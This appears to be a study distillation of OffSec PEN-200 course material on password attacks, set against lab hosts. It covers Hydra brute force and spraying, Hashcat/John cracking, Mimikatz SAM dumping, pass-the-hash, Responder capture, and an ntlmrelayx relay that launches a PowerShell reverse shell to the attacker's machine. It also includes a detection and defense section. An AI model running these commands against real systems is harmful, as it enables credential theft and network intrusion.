PEN-200 Module Block PA — Password Attacks: online dictionary attacks & spraying, offline cracking (Hashcat/JTR), and NTLM abuse

Fuente: material del curso correspondiente (sin video público)

Distilled from OffSec PEN-200 (OSCP) course material (module: Password Attacks — Password Attacks block, instructor-guide videos) — internal training reference, not for redistribution.

Objective

Cover the password-attack toolbox end to end, in the course's order:

  1. Online attacks — THC Hydra dictionary attacks against SSH and RDP, password spraying, and HTTP POST form brute force (with Burp request capture).
  2. Offline cracking fundamentals — keyspace vs. hash-rate math, Hashcat benchmarking, rule-based (mutated) word lists.
  3. Realistic cracking scenarios — KeePass password-manager databases, SSH private-key passphrases, and NTLM hashes from the Windows SAM.
  4. NTLM abuse without cracking — pass-the-hash (smbclient, impacket psexec/wmiexec), capturing Net-NTLMv2 with Responder, and relaying it with ntlmrelayx.

Every offline attack follows the same five-step methodology the videos keep referencing:

  1. Obtain the hash (e.g. from the SAM, a KDBX file, a private key).
  2. Transform it to a hashcat-usable format (*2john scripts, manual edits).
  3. Calculate cracking time (keyspace ÷ hash rate) to pick a feasible attack.
  4. Prepare word list + rules fitted to the known password policy.
  5. Crack, then verify the credential against the real service.

  • Kali attack machine (Hydra, Hashcat, JTR, Responder, impacket, Mimikatz all pre-installed) vs. Windows lab targets.
  • Hosts referenced (hostnames verbatim; no lab IP addresses appear in the ASR transcripts — the videos narrate over screen captures):
  • Target machine with SSH on port 2222 (user george) — dictionary attack target.

Techniques

1. SSH/RDP dictionary attacks & password spraying — PA_01_01

Confirm the service first (SSH open on port 2222), then attack a known username (george, from prior information gathering) with the rockyou wordlist (14M+ passwords, shipped gzipped — decompress with gzip -d):

hydra -l george -P rockyou.txt -s 2222 <target-ip> ssh

Hydra found a valid login. If no usernames are known: enumerate them, or attack built-ins (root on Linux, administrator on Windows).

Password spraying inverts the attack: one discovered password across many usernames — here against RDP with -L (user list) instead of -l:

hydra -L users.txt -p <one-password> <target-ip> rdp

The demo sprayed a password recovered from a database leak and hit two usernames. Rule of the course: spray every plaintext password you find against the targets — users reuse passwords across systems. But use caution: broad spray attacks lock accounts and raise alarms.

2. HTTP POST form attack (Hydra + Burp) — PA_01_02

Web logins need two extra pieces vs. SSH/RDP: the exact POST request body, and a failed-login identifier ("condition string") Hydra uses to distinguish success from failure. Workflow:

  1. Browse to the Tiny File Manager login page; read the docs — default users are admin and user. Default credentials fail.
  2. Start Burp, activate intercept, point the browser at Burp via FoxyProxy, and submit a failed login (user / any password). Capture the request body from Burp.
  3. Note the failure message ("invalid credentials") → condition string.
  4. Run the attack — the http-post-form module takes three colon-delimited fields (form path, request body with ^USER^/^PASS^ placeholders, condition string):
hydra -l user -P rockyou.txt <target-ip> http-post-form \
  "/index.php:captured-post-body:failed-login-string"

Condition-string hygiene: avoid generic keywords like password or username (they appear in success pages too → false positives); shorten the string to something only failure responses contain.

Attack succeeds; login verified by hand. Noise note: this hammers the login endpoint — a WAF or fail2ban (lockout after N failed attempts) blocks it quickly, but web services often lack that protection, making this a highly effective vector.

3. Encryption, hashes, and cracking-time math — PA_02_01

Hand-rolled cracking demonstration: echo -n secret | sha256sum (the -n strips the newline that would change the hash). Hashing secret, secret again (deterministic — same output), then secret1 — the latter matches the captured hash → plaintext recovered. Awkward but illustrative; the real tools are John the Ripper (CPU-first, also GPUs, runs with no extra drivers) and Hashcat (GPU-first via OpenCL/CUDA, also CPUs). GPUs win for most algorithms (thousands of cores); slow hashes like bcrypt actually perform better on CPUs. Tools don't support identical algorithm sets — know both.

Cracking time = keyspace ÷ hash rate.

  • Keyspace = |character set|^password length. Lowercase + uppercase + digits = 62 characters. Verified: 62^5 = 916,132,832 (~916M) candidates for a 5-char password.
  • Count the character set: echo -n "…" | wc -c; compute the power with python3 -c.
  • Hash rate: hashcat -b (benchmark mode) — for MD5/SHA1/SHA256 on a CPU-only Kali VM, values are reported in MH/s (10^6 H/s). GPU rates are orders of magnitude higher.
  • SHA-256 workload with the 62-char set (using the GPU rates implied by the course's table): 5 chars → < 1 s on GPU (~8 s on CPU); 8 chars → ~6.5 hours; 10 chars → ~2.8 years.

The scaling law is the takeaway: password length increases cracking time exponentially; complexity only polynomially → a policy pushing longer passwords beats one pushing more exclamation marks.

4. Mutating word lists — rule-based attacks — PA_02_02

Password policies break raw word lists: the first 10 lines of rockyou contain nothing satisfying "uppercase + special + digit". A rule-based attack mutates each candidate with rule functions; a rule = one or more functions applied left-to-right, and hashcat applies rules from the file with -r.

Demo (10 rockyou lines → demo.txt, lines starting with 1 removed via sed '/^1/d' -i):

  • $1 — append 1; ^3 — prepend 3 (each takes exactly one character).
  • c — capitalize first char, lowercase the rest (matches how users satisfy "one uppercase").
  • Same line = functions chained consecutively onto each password; separate lines = independent rules (each input password yields multiple mutants).
  • Order matters: $1 $! appends 1 then !; $! $1 appends ! then 1.

Full-policy rule for the demo: c $1 $!-style same-line rules (plus $2, $123 variants), then:

hashcat -m 0 -r demo3.rule crackme rockyou.txt          # -m 0 = MD5 (from hashcat's hash-mode reference)
hashcat -r demo.rule --stdout demo.txt                  # debug: print mutants instead of cracking

(The --stdout debug run is how you preview a rule before spending cycles.) Cracks the MD5 hash in seconds on CPU-only. Mindset: model human behavior — users take one "main word", capitalize the first letter, append left-side-keyboard digits and a trailing special character. If you know the target's password policy (or the software's default policy), fit rules to it; otherwise use hashcat's bundled rules (e.g. best64.rule, built for rockyou).

5. Cracking a KeePass password-manager database — PA_02_04

Classic scenario: GUI access (RDP as user json, password [REDACTED]) on a client workstation.

  1. Inventory: Apps & Features → KeePass installed. Research: databases are .kdbx files; there may be several (personal + departmental).
  2. Locate & exfiltrate:
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue

Hit in the user's Documents folder → transfer to a Kali share. 3. Transform: keepass2john database.kdbx > keepass.hash. JTR prepends database as a "username" — useful for user databases, wrong for KeePass (master password only) → strip the prefix in an editor so hashcat accepts the line. 4. Mode: grep hashcat's help output → KeePass = mode 13400. 5. Crack: hashcat 13400 with rockyou + a bundled hashcat rule (the demo uses the rule created for rockyou). Cracks in seconds → open KeePass over RDP with the master password → every stored password of the user is now yours.

6. Cracking an SSH private-key passphrase — PA_02_05

Compromise chain: web file-manager login (from technique 2-style access) → directory contains id_rsa and note.txt. The note is a plaintext password list for user dave (a gold mine — keep it for spraying even when it doesn't crack this key). Manual attempts with each listed password as passphrase (chmod 600 id_rsa first; SSH on port 2222) all fail — but note.txt also says a new password policy was enabled in 2022, so dave's passphrase likely satisfies it.

Methodology application:

  1. ssh2john id_rsa > ssh.hash — output format $6$… (this hash-identifier prefix signifies the private-key format, not SHA-512-crypt).
  2. Strip the filename before the first colon; look up the mode → 22921 (SSH private key, format 2).
  3. Rules from the note's policy: at least 3 digits, one capital, one special. From dave's habits: three digits appear in one password, another starts capitalized → rules c (capitalize), $1 $3 $7-style digit appends, append common special characters.
  4. Attempt: hashcat -m 22921 -r ssh.rule ssh.hash dave-wordlist.txt → token length exception: mode 22921 doesn't support private keys made with the AES-256-CTR cipher (modern default). Fall back to John the Ripper, which handles it — an argument for knowing both tools.
  5. JTR needs the custom rules registered: append the rule file into the JTR config under a name ([List.Rules:sshrules] naming syntax), e.g. via sudo sh -c. Then:
john --wordlist=dave-wordlist.txt --rules=sshrules ssh.hash

Cracked — the passphrase matched dave's habits (policy-compliant mutation of his existing patterns; users rarely change their password habits). Connect: ssh -i id_rsa -p 2222 dave@<target> with the passphrase.

7. Cracking NTLM from the SAM — PA_03_01

RDP to files01 as user offsec (password [REDACTED]). Get-LocalUser reveals a second local user, nelly. Goal: her plaintext password from the NTLM hash. Note: credentials land in the SAM both on interactive logon and when services run under a user account.

Mimikatz (run PowerShell as administrator, from the tools directory):

privilege::debug        # enables SeDebugPrivilege — required for extraction
token::elevate          # elevate to SYSTEM — required for lsadump::sam
lsadump::sam            # dump NTLM hashes from the local SAM

(Mimikatz command syntax is module::command.) lsadump::sam returns NTLM hashes for offsec and nelly; skip the known one. Mimikatz's output format is already hashcat-ready — save nelly's hash to nelly.hash, confirm mode from hashcat help → 1000 (NTLM), crack with rockyou + best64.rule. Cracked instantly (the plaintext was a rockyou + best64 hit, value [REDACTED]), verified by RDP login as nelly. Same flow applies in full AD environments — a core real-life pentest skill.

8. Passing NTLM — PA_03_02

If the password is strong, skip cracking: reuse the hash as the credential. Setup: access on files01 as gunther; assume files01 and files02 local administrators share the same password (common in real assessments).

  • Confirm gunther can't reach files02's restricted SMB share through Explorer (access denied — account unknown on files02).
  • Mimikatz again (privilege::debug, token::elevate, lsadump::sam) → extract the local administrator NTLM hash from the SAM.

Tools that accept NTLM hashes:

# SMB enumeration / file access (lm:ntlm format; blank LM = 32 zeros)
smbclient //<files02-ip>/secrets -U administrator --pw-nt-hash <nthash>
# → dir, get secrets.txt …

# Interactive shell as SYSTEM (uploads a service exe via a writable share)
impacket-psexec -hashes 00000000000000000000000000000000:<nthash> administrator@<files02-ip>

# Shell as the authenticated user instead of SYSTEM
impacket-wmiexec -hashes 00000000000000000000000000000000:<nthash> administrator@<files02-ip>

whoami contrast: psexec always lands as SYSTEM (service-based); wmiexec lands as administrator. CrackMapExec covers SMB management; RDP/WinRM also accept NTLM hashes where rights allow, and Mimikatz itself can pass the hash.

9. Capturing & cracking Net-NTLMv2 — PA_03_03

Scenario: unprivileged shell on files01 (user paul — member of Remote Desktop Users, not Administrators) → Mimikatz is off the table. Alternative: make the machine authenticate to you and capture the Net-NTLMv2 challenge/response (the network-authentication hash Windows clients produce against servers).

ip a                                   # identify the listening interface
sudo responder -I <iface>              # raw sockets need sudo; Kali ships it pre-installed

Then, from the bind shell (port 4444 via netcat, running as paul), trigger an SMB authentication to the Kali machine — a dir against a non-existent share suffices; only the authentication exchange matters, not the listing. Responder (acting as SMB server) captures paul's Net-NTLMv2 hash → save to paul.hash → hashcat mode 5600 (Net-NTLMv2) → crack with rockyou. Verified: RDP to files01 as paul with the recovered password.

10. Relaying Net-NTLMv2 — PA_03_04

Same unprivileged foothold, but the hash is uncrackable (too complex). If the username suggests the account is a local administrator elsewhere (files02), relay the authentication instead of cracking it.

# Kali: relay server + target + command to run as the relayed user
impacket-ntlmrelayx --no-http-server -smb2support -t <files02-ip> \
  -c 'powershell -enc <b64 reverse-shell one-liner — kali IP, port 8080>'
nc -lvnp 8080                           # catch the reverse shell
# Victim: connect to bind shell, then trigger:
dir \\<kali-ip>\anything               # arbitrary share name — just forces SMB auth to us

ntlmrelayx receives the SMB connection, forwards the authentication to files02; if the relayed user is a local admin there, authentication succeeds and the -c command executes as that user → reverse shell on files02.

Caveat stated in the course: UAC remote restrictions limit which local accounts can be used for pass-the-hash / relay outside an Active Directory environment (non-domain, non-admin, or filtered local accounts are refused over the network).

Detection & defense

  • Hydra online attacks (SSH/RDP/HTTP): all generate high-volume failed-authentication noise — the single best detection. Defense: account lockout policies (fail2ban for SSH, WAF/rate-limiting on web logins), RDP restricted/behind VPN + NLA, alert on authentication bursts per source IP and on sprays (one password failing across many accounts).
  • Password spraying deliberately stays under lockout thresholds — detect cross-account correlation (one password, many usernames), not per-account failure counts.
  • Cracking-time math is the defender's argument: length beats complexity (exponential vs. polynomial growth). Enforce minimum length (passphrases) over rotation-to-special-characters.
  • Rule-based attacks mirror human habits (first-letter capitalization, trailing 1/!, left-side keyboard digits): block known-leaked passwords (breach-password screening) and NIST-style composition guidance; assume every rockyou-based mutant will be tried.
  • KeePass extraction: attack chain is RDP → file discovery → file exfiltration → offline crack. Detect via off-hours/recursive filesystem scans, database-file copies to shares, and — decisively — strong master passwords (KDBX cracking time is entirely policy-driven). Consider KDBX with keyfile/OTP second factor.
  • SSH private keys: crackable passphrases make exfiltrated keys a full compromise. Require passphrases (and prefer modern ciphers awareness: AES-256-CTR keys defeat hashcat mode 22921 but not JTR — assume offline attack), audit web-served directories for key material, rotate keys on suspicion.
  • Mimikatz/SAM dumping requires admin + SeDebugPrivilege: EDR should alert on debug-privilege use, LSASS/SAM access, and lsadump patterns; restrict local admin membership (the paul-vs-gunther distinction is exactly what blocks it).
  • NTLM reuse (pass-the-hash): the attack works because local-admin hashes are shared across hosts. Defenses: unique local admin passwords per host (LAPS), restrict who can authenticate with NTLM, prefer Kerberos-only.
  • Net-NTLMv2 capture/relay: Responder answers LLMNR/NBT-NS/mDNS name-resolution calls — disable those protocols (or use DNS sanctions), enable SMB signing (blocks relay), and disable NTLM where possible. Any unprivileged dir \\<attacker>\share from a shell should look like a forced-authentication anomaly on the wire.
  • UAC remote restrictions are the last-line mitigations outside AD — keep them, but don't rely on them alone.

  • Mimikatz syntax reconstructed: ASR renders sekurlsa::logonpasswords as "SecureLSA Logon Passwords" and flattens module::command to "delimited by two colons" — the standard command spellings (privilege::debug, token::elevate, lsadump::sam) are restored here. sekurlsa::logonpasswords is described in the audio but not executed (output too large; lsadump::sam used instead).
  • Hash-mode 22921 / $6 caveat: the audio says "$6 signifies SHA-512", but the hash is the ssh2john private-key format ($sshng$ family), and 22921 is hashcat's SSH-private-key (format 2) mode — the "SHA-512" line is treated as an ASR/slide conflation. Flagged rather than resolved.
  • Hydra flag usage: the audio flips between "dash L" and "dash lowercase L" for the user-list vs. single-user options in the spray example ("with a list using -l"); the conventional mapping (-l single user, -L user list, -p single password, -P password list) is applied above.
  • Impacket psexec shell default: the audio says leaving the trailing command argument empty runs "command.exe"; the script's actual default is cmd.exe. Kept as description, not quoted.
  • Numbers verified, not quoted blind: 62^5 = 916,132,832; the course's ~6.5 h (8-char) and ~2.8 y (10-char) SHA-256 GPU figures are mutually consistent with an implied rate of ~9.3 GH/s (recomputed in this distillation).
